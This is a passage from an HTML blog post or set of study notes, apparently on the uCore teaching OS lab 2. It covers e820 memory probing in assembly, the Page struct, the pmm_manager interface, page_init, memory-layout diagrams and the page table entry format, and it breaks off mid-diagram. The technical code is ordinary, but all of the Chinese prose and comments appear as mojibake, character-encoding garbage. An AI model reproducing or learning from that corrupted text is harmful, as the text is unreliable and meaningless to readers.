è¢«å¯åŠ¨ä¹‹åï¼Œæœ€é‡è¦çš„äº‹æƒ…å°±æ˜¯çŸ¥é“è¿˜æœ‰å¤šå°‘å†…å­˜å¯ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè·å–å†…å­˜å¤§å°çš„æ–¹æ³•ç”± BIOS ä¸­æ–­è°ƒç”¨å’Œç›´æ¥æ¢æµ‹ä¸¤ç§ã€‚ä½†BIOS ä¸­æ–­è°ƒç”¨æ–¹æ³•æ˜¯ä¸€èˆ¬åªèƒ½åœ¨å®æ¨¡å¼ä¸‹å®Œæˆï¼Œè€Œç›´æ¥æ¢æµ‹æ–¹æ³•å¿…é¡»åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å®Œæˆã€‚é€šè¿‡ BIOS ä¸­æ–­è·å–å†…å­˜å¸ƒå±€æœ‰ä¸‰ç§æ–¹å¼ï¼Œéƒ½æ˜¯åŸºäºINT 15hä¸­æ–­ï¼Œåˆ†åˆ«ä¸º88h e801h e820hã€‚ä½†æ˜¯ å¹¶éåœ¨æ‰€æœ‰æƒ…å†µä¸‹è¿™ä¸‰ç§æ–¹å¼éƒ½èƒ½å·¥ä½œã€‚åœ¨ Linux kernel é‡Œï¼Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯ä¾æ¬¡å°è¯•è¿™ä¸‰ ç§æ–¹æ³•ã€‚è€Œåœ¨æœ¬å®éªŒä¸­ï¼Œæˆ‘ä»¬é€šè¿‡e820hä¸­æ–­è·å–å†…å­˜ä¿¡æ¯ã€‚å› ä¸ºe820hä¸­æ–­å¿…é¡»åœ¨å®æ¨¡å¼ä¸‹ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ bootloader è¿›å…¥ä¿æŠ¤æ¨¡å¼ä¹‹å‰è°ƒç”¨è¿™ä¸ª BIOS ä¸­æ–­ï¼Œå¹¶ä¸”æŠŠ e820 æ˜  å°„ç»“æ„<strong>ä¿å­˜åœ¨ç‰©ç†åœ°å€0x8000</strong>å¤„ã€‚</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_5_probe_phymem_methods.html">INT 15hè°ƒç”¨</a>å®Œæˆå, å°†è¿”å›å€¼å­˜å…¥ä¸€ä¸ªç»“æ„ä½“ä¸­:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e820map</span> &#123;</span><br><span class="hljs-keyword">int</span> nr_map;<span class="hljs-comment">//å››å­—èŠ‚, mapä¸­çš„å…ƒç´ ä¸ªæ•°</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> addr;<span class="hljs-comment">// å¯ç”¨å†…å­˜çš„èµ·å§‹åœ°å€</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<span class="hljs-comment">// å†…å­˜å—å¤§å°</span><br>        <span class="hljs-keyword">long</span> type;    <span class="hljs-comment">// å››å­—èŠ‚, æŸå—å†…å­˜çš„å±æ€§ã€‚1æ ‡è¯†å¯è¢«ä½¿ç”¨å†…å­˜å—ï¼›2è¡¨ç¤ºä¿ç•™çš„å†…å­˜å—ï¼Œä¸å¯æ˜ å°„</span><br>    &#125; <span class="hljs-built_in">map</span>[E820MAX];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>â€‹    å­˜å…¥çš„è¿‡ç¨‹ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">probe_memory:<br>    movl $0, 0x8000   # åˆå§‹åŒ–ï¼Œå‘å†…å­˜åœ°å€0x8000ï¼Œå³uCoreç»“æ„e820mapä¸­çš„æˆå‘˜nr_mapä¸­å†™å…¥0<br>    xorl %ebx, %ebx   # åˆå§‹åŒ–%ebxä¸º0ï¼Œè¿™æ˜¯int 0x15çš„å…¶ä¸­ä¸€ä¸ªå‚æ•°<br>    movw $0x8004, %di # åˆå§‹åŒ–%diå¯„å­˜å™¨ï¼Œä½¿å…¶æŒ‡å‘ç»“æ„e820mapä¸­çš„æˆå‘˜æ•°ç»„map<br>start_probe:<br>    movl $0xE820, %eax  # BIOS 0x15ä¸­æ–­çš„å­åŠŸèƒ½ç¼–å· %eax == 0xE820<br>    movl $20, %ecx    # å­˜æ”¾åœ°å€èŒƒå›´æè¿°ç¬¦çš„å†…å­˜å¤§å°ï¼Œè‡³å°‘20<br>    movl $SMAP, %edx  # ç­¾åï¼Œ %edx == 0x534D4150h(&quot;SMAP&quot;å­—ç¬¦ä¸²çš„ASCIIç )<br>    int $0x15     # è°ƒç”¨0x15ä¸­æ–­<br>    jnc cont      # å¦‚æœè¯¥ä¸­æ–­æ‰§è¡Œå¤±è´¥ï¼Œåˆ™CFæ ‡å¿—ä½ä¼šç½®1ï¼Œæ­¤æ—¶è¦é€šçŸ¥UCoreå‡ºé”™<br>    movw $12345, 0x8000 # å‘ç»“æ„e820mapä¸­çš„æˆå‘˜nr_mapä¸­å†™å…¥ç‰¹æ®Šä¿¡æ¯ï¼ŒæŠ¥å‘Šå½“å‰é”™è¯¯<br>    jmp finish_probe    # è·³è½¬è‡³ç»“æŸï¼Œä¸å†æ¢æµ‹å†…å­˜<br>cont:<br>    addw $20, %di   # å¦‚æœä¸­æ–­æ‰§è¡Œæ­£å¸¸ï¼Œåˆ™ç›®æ ‡å†™å…¥åœ°å€å°±å‘åç§»åŠ¨ä¸€ä¸ªä½ç½®<br>    incl 0x8000     # e820::nr_map++<br>    cmpl $0, %ebx   # æ‰§è¡Œä¸­æ–­åï¼Œè¿”å›çš„%ebxæ˜¯åŸå…ˆçš„%ebxåŠ ä¸€ã€‚å¦‚æœ%ebxä¸º0ï¼Œåˆ™è¯´æ˜å½“å‰å†…å­˜æ¢æµ‹å®Œæˆ<br>    jnz start_probe<br>finish_probe:<br></code></pre></div></td></tr></table></figure><p><code>edata</code>è¡¨ç¤º<code>kernel</code>çš„<code>data</code>æ®µç»“æŸåœ°å€ï¼›<code>end</code>è¡¨ç¤º<code>bss</code>æ®µçš„ç»“æŸåœ°å€ï¼ˆå³æ•´ä¸ª<code>kernel</code>çš„ç»“æŸåœ°å€ï¼‰</p><p><code>edata[]</code>å’Œ <code>end[]</code>è¿™äº›å˜é‡æ˜¯ldæ ¹æ®kernel.ldé“¾æ¥è„šæœ¬ç”Ÿæˆçš„å…¨å±€å˜é‡ï¼Œè¡¨ç¤ºç›¸åº”æ®µçš„ç»“æŸåœ°å€ï¼Œå®ƒä»¬ä¸åœ¨ä»»ä½•ä¸€ä¸ª.Sã€.cæˆ–.hæ–‡ä»¶ä¸­å®šä¹‰ï¼Œä½†ä»ç„¶å¯ä»¥åœ¨æºç æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><h3 id="2-ç®¡ç†ç‰©ç†-å†…å­˜"><a href="#2-ç®¡ç†ç‰©ç†-å†…å­˜" class="headerlink" title="2.ç®¡ç†ç‰©ç† å†…å­˜"></a>2.ç®¡ç†<em>ç‰©ç†</em> å†…å­˜</h3><ul><li>æ¯ä¸€ä¸ªç‰©ç†é¡µçš„å±æ€§ç”¨ç»“æ„Pageæ¥è¡¨ç¤º</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;        <span class="hljs-comment">// page frame&#x27;s reference counter</span><br>    <span class="hljs-keyword">uint32_t</span> flags; <span class="hljs-comment">// array of flags that describe the status of the page frame</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<span class="hljs-comment">// the num of free *page*, used in first fit pm manager</span><br>    <span class="hljs-keyword">list_entry_t</span> page_link;<span class="hljs-comment">// free list link</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>è€Œflagç¬¬ä¸€ä½å’Œç¬¬äºŒä½(å³bit 0 and bit 1, PG_reservedå’ŒPG_propertyçš„0å’Œ1æ˜¯æŒ‡ç¬¬å‡ ä½):</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Flags describing the status of a page frame */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_reserved                 0       <span class="hljs-comment">// the page descriptor is reserved for kernel or unusable</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_property                 1       <span class="hljs-comment">// the member &#x27;property&#x27; is valid (free or not)</span></span><br></code></pre></div></td></tr></table></figure><p>â€‹    éœ€è¦æ³¨æ„çš„æ˜¯ç”¨åˆ°propertyæˆå‘˜å˜é‡çš„è¿™ä¸ªPageæ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯è¿™ä¸ªè¿ç»­å†…å­˜ç©ºé—²å—åœ°å€<strong>æœ€å°çš„ä¸€é¡µ</strong>ï¼ˆå³å¤´ä¸€é¡µï¼Œ Head Pageï¼‰,<br>â€‹    ç”¨bit PG_propertyæ¥enable</p><ul><li>ä½¿ç”¨btlæŒ‡ä»¤ç½®ä½æŸä¸€ä¸ªbit:</li></ul><blockquote><p>BTS %1,  %2     :å…ˆæŠŠ%2å¯¹åº”çš„å†…å­˜åœ°å€çš„ç¬¬%1ä½çš„å€¼å¡«å…¥cflagså¯„å­˜å™¨çš„CFï¼Œç„¶åæŠŠè¯¥ä½<strong>ç½®ä½</strong>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SetPageReserved(page)       set_bit(PG_reserved, &amp;((page)-&gt;flags)) <span class="hljs-comment">//setbitä½¿ç”¨çš„æ˜¯å†…è”æ±‡ç¼–å½¢å¼çš„btlæŒ‡ä»¤</span></span><br></code></pre></div></td></tr></table></figure><ul><li>ç®¡ç†ç©ºé—²å—</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* free_area_t - maintains a doubly linked list to record free (unused) pages */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">list_entry_t</span> free_list;                                <span class="hljs-comment">// the list header</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_free;                                 <span class="hljs-comment">// num of free pages in this free list</span><br>&#125; <span class="hljs-keyword">free_area_t</span>;<br></code></pre></div></td></tr></table></figure><ul><li>pmm_manager(): ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåˆ—è¡¨, ç”¨äºå¼•ç”¨ç®¡ç†å†…å­˜çš„å‡½æ•°, æŒ‡å‘è¿™ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆä¹Ÿæ˜¯<code>pmm_manager</code><br>é¡¹ç›®å®šä¹‰äº†ä¸€ä¸ª<code>default_pmm_manager</code>, æ¯ä¸€ä¸ªå‡½æ•°æŒ‡å‘çš„å…·ä½“å‡½æ•°å®šä¹‰åœ¨default_pmm_init.cä¸­, å°†æ­¤ç»“æ„ä½“åœ°å€èµ‹å€¼ç»™<br>(pmm_manager *)pmm_manager, å¯ä»¥æ›´æ”¹ä¸ºå…¶ä»–å†…å­˜åˆ†é…ç®—æ³•</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pmm_manager</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//ç‰©ç†å†…å­˜é¡µç®¡ç†å™¨çš„åå­—</span><br>            <span class="hljs-keyword">void</span> (*init)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//åˆå§‹åŒ–å†…å­˜ç®¡ç†å™¨</span><br>            <span class="hljs-keyword">void</span> (*init_memmap)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//åˆå§‹åŒ–ç®¡ç†ç©ºé—²å†…å­˜é¡µçš„æ•°æ®ç»“æ„</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *(*<span class="hljs-title">alloc_pages</span>)(<span class="hljs-title">size_t</span> <span class="hljs-title">n</span>);</span> <span class="hljs-comment">//åˆ†é…nä¸ªç‰©ç†å†…å­˜é¡µ</span><br>            <span class="hljs-keyword">void</span> (*free_pages)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//é‡Šæ”¾nä¸ªç‰©ç†å†…å­˜é¡µ</span><br>            <span class="hljs-keyword">size_t</span> (*nr_free_pages)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//è¿”å›å½“å‰å‰©ä½™çš„ç©ºé—²é¡µæ•°</span><br>            <span class="hljs-keyword">void</span> (*check)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//ç”¨äºæ£€æµ‹åˆ†é…/é‡Šæ”¾å®ç°æ˜¯å¦æ­£ç¡®çš„è¾…åŠ©å‡½æ•°</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><code>kern_init()</code>ä¸­<code>pmm_init()</code>çš„==<code>page_init()</code>==éƒ¨åˆ†å†…å®¹</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// code above is traverse all memmap(e820map) to search the maxpa and print the memmap out</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> end[];<br><br><span class="hljs-comment">// calc the sum of pages</span><br>npage = maxpa / PGSIZE;<br><span class="hljs-comment">// </span><br>pages = (struct Page *)ROUNDUP((<span class="hljs-keyword">void</span> *)end, PGSIZE);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npage; i ++) &#123;<br>SetPageReserved(pages + i);<br>&#125;<br><br><span class="hljs-keyword">uintptr_t</span> freemem = PADDR((<span class="hljs-keyword">uintptr_t</span>)pages + <span class="hljs-keyword">sizeof</span>(struct Page) * npage);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*    SetPageReservedåªéœ€æŠŠç‰©ç†åœ°å€å¯¹åº”çš„Pageç»“æ„ä¸­çš„flagsæ ‡å¿—è®¾ç½®ä¸ºPG_reserved ï¼Œè¡¨ç¤ºè¿™äº›</span><br><span class="hljs-comment">*é¡µå·²ç»è¢«ä½¿ç”¨äº†ï¼Œå°†æ¥ä¸èƒ½è¢«ç”¨äºåˆ†é…ã€‚</span><br><span class="hljs-comment">*    è€Œinit_memmapå‡½æ•°åˆ™æ˜¯æŠŠç©ºé—²ç‰©ç†é¡µå¯¹åº”çš„Pageç»“æ„ä¸­çš„flagså’Œå¼•ç”¨è®¡æ•°refæ¸…é›¶ï¼Œå¹¶åŠ åˆ°</span><br><span class="hljs-comment">*free_area.free_listæŒ‡å‘çš„åŒå‘åˆ—è¡¨ä¸­ï¼Œä¸ºå°†æ¥çš„ç©ºé—²é¡µç®¡ç†åšå¥½åˆå§‹åŒ–å‡†å¤‡å·¥ä½œã€‚</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// code below corrects free physical blocks&#x27; boundaries and initialized </span><br><span class="hljs-comment">// page(not page table), adding page to freelist.</span><br><span class="hljs-comment">// then, all physical pages&#x27; info are stored in base address (struct Page *)pages.</span><br><span class="hljs-comment">// page(s) can be accessed by `struct Page *pages;`, just like array.</span><br></code></pre></div></td></tr></table></figure><h3 id="3-å†…å­˜ç©ºé—´å¸ƒå±€"><a href="#3-å†…å­˜ç©ºé—´å¸ƒå±€" class="headerlink" title="3.å†…å­˜ç©ºé—´å¸ƒå±€"></a>3.å†…å­˜ç©ºé—´å¸ƒå±€</h3><ul><li><p>åœ¨uCoreä¸­ï¼ŒCPUå…ˆåœ¨bootasm.Sï¼ˆå®æ¨¡å¼ï¼‰ä¸­é€šè¿‡è°ƒç”¨BIOSä¸­æ–­ï¼Œå°†ç‰©ç†å†…å­˜çš„ç›¸å…³æè¿°ç¬¦å†™å…¥ç‰¹å®šä½ç½®<code>0x8000</code>ï¼Œç„¶åè¯»å…¥kernelè‡³ç‰©ç†åœ°å€<code>0x10000</code>ã€è™šæ‹Ÿåœ°å€<code>0xC0000000</code>ã€‚</p></li><li><p>è€Œkernelåœ¨<code>page_init</code>å‡½æ•°ä¸­ï¼Œè¯»å–ç‰©ç†å†…å­˜åœ°å€<code>0x8000</code>å¤„çš„å†…å­˜ï¼ŒæŸ¥æ‰¾æœ€å¤§ç‰©ç†åœ°å€ï¼Œå¹¶è®¡ç®—å‡ºæ‰€éœ€çš„<strong>é¡µé¢æ•°</strong>ã€‚è™šæ‹Ÿé¡µè¡¨<code>VPT(Virtual Page Table)</code>çš„åœ°å€ç´§è·Ÿ<code>kernel</code>ï¼Œå…¶åœ°å€ä¸º4kå¯¹é½ã€‚è™šæ‹Ÿåœ°å€ç©ºé—´ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G -----------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                     |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT ----------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                     |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP ------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |    Remapped Physical Memory     | RW/-- KMEMSIZE=896MB</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *     KERNBASE -----&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><p>å®Œæˆ<strong>ç‰©ç†å†…å­˜é¡µç®¡ç†åˆå§‹åŒ–å·¥ä½œ</strong>åï¼Œå…¶ç‰©ç†åœ°å€çš„åˆ†å¸ƒç©ºé—´å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">+----------------------+ &lt;- <span class="hljs-number">0xFFFFFFFF</span>(4GB)       ----------------------------  4GB<br>|  ä¸€äº›ä¿ç•™å†…å­˜ï¼Œä¾‹å¦‚ç”¨äº|                                ä¿ç•™ç©ºé—´<br>|   32bitè®¾å¤‡æ˜ å°„ç©ºé—´ç­‰  |<br>+----------------------+ &lt;- å®é™…ç‰©ç†å†…å­˜ç©ºé—´ç»“æŸåœ°å€ ----------------------------<br>|                      |<br>|                      |<br>|     ç”¨äºåˆ†é…çš„         |                                 å¯ç”¨çš„ç©ºé—´<br>|    ç©ºé—²å†…å­˜åŒºåŸŸ        |<br>|                      |<br>|                      |<br>|                      |<br>+----------------------+ &lt;- ç©ºé—²å†…å­˜èµ·å§‹åœ°å€      ----------------------------  <br>|     VPTé¡µè¡¨å­˜æ”¾ä½ç½®      |                                VPTé¡µè¡¨å­˜æ”¾çš„ç©ºé—´   (4MBå·¦å³)<br>+----------------------+ &lt;- bssæ®µç»“æŸå¤„           ----------------------------<br>|uCoreçš„textã€dataã€bss |                              uCoreå„æ®µçš„ç©ºé—´<br>+----------------------+ &lt;- <span class="hljs-number">0x00100000</span>(1MB)       ---------------------------- 1MB<br>|       BIOS ROM       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000F0000</span>(960KB)<br>|     16bitè®¾å¤‡æ‰©å±•ROM  |                             æ˜¾å­˜ä¸å…¶ä»–ROMæ˜ å°„çš„ç©ºé—´<br>+----------------------+ &lt;- <span class="hljs-number">0x000C0000</span>(768KB)<br>|     CGAæ˜¾å­˜ç©ºé—´       |<br>+----------------------+ &lt;- <span class="hljs-number">0x000B8000</span>            ---------------------------- 736KB<br>|        ç©ºé—²å†…å­˜       |<br>+----------------------+ &lt;- <span class="hljs-number">0x00011000</span>(+4KB)          uCore headerçš„å†…å­˜ç©ºé—´<br>| uCoreçš„ELF headeræ•°æ® |<br>+----------------------+ &lt;-<span class="hljs-number">0x00010000</span>             ---------------------------- 64KB<br>|       ç©ºé—²å†…å­˜        |<br>+----------------------+ &lt;- åŸºäºbootloaderçš„å¤§å°          bootloaderçš„<br>|      bootloaderçš„   |                                    å†…å­˜ç©ºé—´<br>|     textæ®µå’Œdataæ®µ    |<br>+----------------------+ &lt;- <span class="hljs-number">0x00007C00</span>            ---------------------------- 31KB<br>|   bootloaderå’ŒuCore  |<br>|      å…±ç”¨çš„å †æ ˆ       |                                 å †æ ˆçš„å†…å­˜ç©ºé—´<br>+----------------------+ &lt;- åŸºäºæ ˆçš„ä½¿ç”¨æƒ…å†µ<br>|     ä½åœ°å€ç©ºé—²ç©ºé—´    |<br>+----------------------+ &lt;-  <span class="hljs-number">0x00000000</span>           ---------------------------- 0KB<br></code></pre></div></td></tr></table></figure><p>æ˜“çŸ¥ï¼Œå…¶é¡µè¡¨åœ°å€ä¹‹ä¸Šçš„ç‰©ç†å†…å­˜ç©ºé—´æ˜¯ç©ºé—²çš„ï¼ˆé™¤å»ä¿ç•™çš„å†…å­˜ï¼‰ï¼Œæ•…å°†è¯¥ç‰©ç†åœ°å€ä¹‹ä¸‹çš„ç‰©ç†ç©ºé—´å¯¹åº”çš„é¡µè¡¨å…¨éƒ¨è®¾ç½®ä¸ºä¿ç•™(reserved)ã€‚å¹¶å°†è¿™äº›ç©ºé—²çš„å†…å­˜å…¨éƒ¨æ·»åŠ è¿›é¡µè¡¨é¡¹ä¸­ã€‚</p></li></ul><h3 id="4-åˆ†é…ç®—æ³•å®ç°"><a href="#4-åˆ†é…ç®—æ³•å®ç°" class="headerlink" title="4.åˆ†é…ç®—æ³•å®ç°"></a>4.åˆ†é…ç®—æ³•å®ç°</h3><blockquote><p>åœ¨default_pmm.cä¸­</p><p>å®ç°äº†æœ€ç®€å•çš„first-fit, å…¶ä»–ç®—æ³•ä¸ºchallenge</p></blockquote><h3 id="5-æ®µé¡µå¼å­˜å‚¨ç®¡ç†"><a href="#5-æ®µé¡µå¼å­˜å‚¨ç®¡ç†" class="headerlink" title="5.æ®µé¡µå¼å­˜å‚¨ç®¡ç†"></a>5.æ®µé¡µå¼å­˜å‚¨ç®¡ç†</h3><h4 id="æ€»ä½“æ¡†æ¶ã€åˆ†é¡µæœºåˆ¶å›¾"><a href="#æ€»ä½“æ¡†æ¶ã€åˆ†é¡µæœºåˆ¶å›¾" class="headerlink" title="æ€»ä½“æ¡†æ¶ã€åˆ†é¡µæœºåˆ¶å›¾"></a>æ€»ä½“æ¡†æ¶ã€åˆ†é¡µæœºåˆ¶å›¾</h4><img src="https://i.loli.net/2021/11/20/Uvnt9ZJfP32FMbr.png" alt="image-20211120231536312" style="zoom:67%;" /><p>Page Directory is 4Kbyte-alignd, æ‰€ä»¥CR3ç»™çš„32ä½åœ°å€å…¶å®ä½12ä½ä¸º0, åªè¦æŠŠ32:12å’ŒLinear addressçš„31:22æ‹¼æˆä¸€ä¸ª32ä½åœ°å€å³å¯:</p><img src="https://i.loli.net/2021/11/23/YQoyfDqFVTZPs6C.png" alt="image-20211120233531488" style="zoom:67%;" /><h4 id="è™šæ‹Ÿé¡µè¡¨å’Œé¡µç›®å½•è¡¨ç»“æ„"><a href="#è™šæ‹Ÿé¡µè¡¨å’Œé¡µç›®å½•è¡¨ç»“æ„" class="headerlink" title=" è™šæ‹Ÿé¡µè¡¨å’Œé¡µç›®å½•è¡¨ç»“æ„"></a><span id="vpt&pdt"> </span>è™šæ‹Ÿé¡µè¡¨å’Œé¡µç›®å½•è¡¨ç»“æ„</h4><p>æ¯ä¸ª<strong>é¡µè¡¨é¡¹</strong>ï¼ˆPTEï¼‰éƒ½ç”±ä¸€ä¸ª32ä½æ•´æ•°æ¥å­˜å‚¨æ•°æ®ï¼Œå…¶ç»“æ„å¦‚ä¸‹</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">      31-12      9-11     8    7    6   5   4      3    2   1   0<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<br>|     Offset   | Avail | MBZ | PS | D | A | PCD | PWT | U | W | P |<br>+<span class="hljs-params">--------------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">-----</span>+<span class="hljs-params">----</span>+<span class="hljs-params">---</span>+<span class="hljs-params">---</span>+<span 